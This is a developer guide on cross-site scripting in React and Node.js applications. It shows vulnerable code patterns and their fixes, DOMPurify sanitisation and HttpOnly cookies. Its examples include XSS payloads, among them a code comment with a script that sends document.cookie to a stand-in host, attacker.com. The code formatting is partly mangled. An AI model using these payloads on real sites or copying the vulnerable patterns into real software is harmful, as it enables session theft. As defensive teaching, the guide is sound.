While modern frameworks like React offer powerful protection out of the box, XSS vulnerabilities can still occur in a React
and Node.js application if a developer explicitly bypasses safety features, uses insecure dependencies, or misconfigures
backend endpoints. [1, 2]

## How React Protects You by Default

When you render variables in JSX using curly braces {}, React automatically applies context-aware HTML entity encoding. [3]

// SAFE: React treats this strictly as plain text, not codeconst userInput = "<script>alert('xss')</script>";return

<div>{userInput}</div>;

## The browser prints the exact string literal on the screen and refuses to execute the script. [4]

## How XSS Happens in React (Frontend Flaws)## 1. Bypassing Escaping with dangerouslySetInnerHTML

If you need to render rich text or markdown from a user input, you might be tempted to bypass React's security framework
using dangerouslySetInnerHTML. This is the most common source of Stored or Reflected XSS in React. [5, 6, 7, 8]

// VULNERABLE: Direct rendering of unsanitized HTML stringfunction UserProfile({ bio }) { // If bio contains:
<img src=x onerror=alert(document.cookie)> return <div dangerouslySetInnerHTML={{ __html: bio }} />; }

- Why it breaks: The browser interprets the payload as live HTML nodes, executing the JavaScript inside the onerror attribute
  immediately. [9]

## 2. Vulnerable Native Attributes (e.g., href)

React does not automatically validate URL structures inside native attributes. Attackers can inject a pseudo-protocol like
javascript: directly into custom user links. [10, 11]

// VULNERABLE: Unchecked URL injectionfunction UserLink({ websiteUrl }) { // If websiteUrl is: javascript:alert('XSS') return
<a href={websiteUrl}>Visit My Website</a>; }

- Why it breaks: When a victim clicks this link, the browser executes the trailing JavaScript block instead of navigating to
  a website. [12, 13, 14]

## 3. DOM-Based XSS via Direct Window Access [15]

If your React application bypasses virtual DOM state and directly manipulates the browser's native DOM using variables pulled
straight from the URL bar, you introduce client-side flaws. [16, 17]

// VULNERABLE: Bypassing React entirely useEffect(() => { const params = new URLSearchParams(window.location.search); const
name = params.get("name"); // Payloads like: <img src=x onerror=...> document.getElementById("greeting").innerHTML = name; },
[]);

## How XSS Looks on the Node.js Backend

The backend (Node.js/Express) typically serves as the storage medium or the reflection channel for the script.

## The Storage Channel (Stored XSS)

If Node.js saves a user's malicious payload straight into the database without validation, it sets up a persistent trap for
the frontend:

// Node.js Express endpoint saving unsanitized data app.post('/api/comments', async (req, res) => { const { text } =
req.body; // payload: <script>fetch('http://attacker.com' + document.cookie)</script>

// Safe from SQLi because it's parameterized, but still dangerous for XSS! await db.query('INSERT INTO comments (text) VALUES
($1)', [text]); res.json({ success: true }); });

## When another user's React frontend fetches /api/comments and uses an unsafe method to render that array, the script triggers for every single viewer.

## Remediation: Securing React and Node.js## 1. Sanitize HTML Using DOMPurify [18, 19]

If you must render raw HTML inside React, strip out dangerous tags and execution handlers using a dedicated sanitization
library like dompurify before pushing it into dangerouslySetInnerHTML. [20, 21]

import DOMPurify from 'dompurify'; function UserProfile({ bio }) { // Cleans out <script>, onerror, onload, etc., while
keeping safe formatting like <b> or <i> const cleanHTML = DOMPurify.sanitize(bio);

return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />; }

## 2. Protect JWTs with HttpOnly Cookies

XSS scripts are written primarily to steal sensitive user access tokens from localStorage. By setting your authentication
cookies via Node.js with the HttpOnly attribute, frontend JavaScript cannot access them: [22, 23]

// Secure Node.js Response Cookie res.cookie('token', jwtToken, { httpOnly: true, // Prevents client-side scripts from
reading the cookie secure: true, // Requires HTTPS sameSite: 'strict' });
